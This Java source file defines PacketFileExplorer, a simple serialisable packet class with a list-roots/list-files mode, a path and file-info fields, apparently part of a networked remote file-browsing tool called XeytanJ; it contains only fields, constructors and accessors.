package com.melardev.xeytanj.net.packets.filesystem;

import com.melardev.xeytanj.models.FileInfoStructure;
import com.melardev.xeytanj.net.packets.Packet;
import com.melardev.xeytanj.net.packets.PacketType;

public class PacketFileExplorer extends Packet {


    public enum DataContent {
        LIST_ROOTS, LIST_FILES
    }

    public DataContent dataContent;
    public String path;
    public FileInfoStructure[] fileInfoStructures;
    private boolean isRoot;

    public PacketFileExplorer() {
        super(PacketType.FILE_EXPLORER);
        dataContent = DataContent.LIST_ROOTS;
    }

    public PacketFileExplorer(String _path) {
        super(PacketType.FILE_EXPLORER);
        dataContent = DataContent.LIST_FILES;
        path = _path;
    }

    public PacketFileExplorer(FileInfoStructure[] fileInfoStructures, boolean isRoot) {
        super(PacketType.FILE_EXPLORER);
        dataContent = isRoot ? DataContent.LIST_ROOTS : DataContent.LIST_FILES;
        this.fileInfoStructures = fileInfoStructures;
        this.isRoot = isRoot;
    }

    public FileInfoStructure[] getFileInfoStructures() {
        return fileInfoStructures;
    }

    public DataContent getDataContent() {
        return dataContent;
    }

    public void setDataContent(DataContent dataContent) {
        this.dataContent = dataContent;
    }

    public String getPath() {
        return path;
    }

    public void setPath(String path) {
        this.path = path;
    }

    public void setFileInfoStructures(FileInfoStructure[] fileInfoStructures) {
        this.fileInfoStructures = fileInfoStructures;
    }

    public boolean isRoot() {
        return isRoot;
    }

    public void setRoot(boolean root) {
        isRoot = root;
    }

    public DataContent getAction() {
        return dataContent;
    }
}
